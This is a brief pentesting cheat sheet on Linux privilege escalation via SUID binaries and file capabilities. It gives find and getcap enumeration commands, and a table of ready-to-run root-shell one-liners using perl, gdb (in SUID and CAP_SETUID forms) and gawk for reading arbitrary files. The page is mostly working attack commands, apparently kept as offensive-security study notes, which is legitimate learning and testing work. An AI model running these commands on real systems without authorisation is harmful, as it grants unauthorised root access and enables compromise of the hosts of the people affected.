# SUID

_<mark style="background-color:purple;">**enumerate SUID binaries**</mark>_

_search for SUID binaries:_

```powershell
find / -perm -u=s -type f 2>/dev/null
```

&#x20;list all files on the system that have special capabilities assigned to them:

```powershell
/usr/sbin/getcap -r / 2>/dev/null
```

* **CAP\_SETUID**&#x20;

<mark style="background-color:green;">check results on</mark> [<mark style="background-color:green;">https://gtfobins.github.io/</mark>](https://gtfobins.github.io/)&#x20;

| binary with SUID | priv esc command                                                                                                                                                                                |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| perl             | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`                                                                                                                             |
| gdb              | <p>SUID=<code>gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit</code><br>CAP_SETUID=<code>gdb -nx -ex 'python import os; os.setuid(0)' -ex'!sh' -ex quit</code><br></p> |
| gawk             | <p><code>LFILE="file_to_read"</code><br><code>gawk '//' "$LFILE"</code></p>                                                                                                                     |
|                  |                                                                                                                                                                                                 |

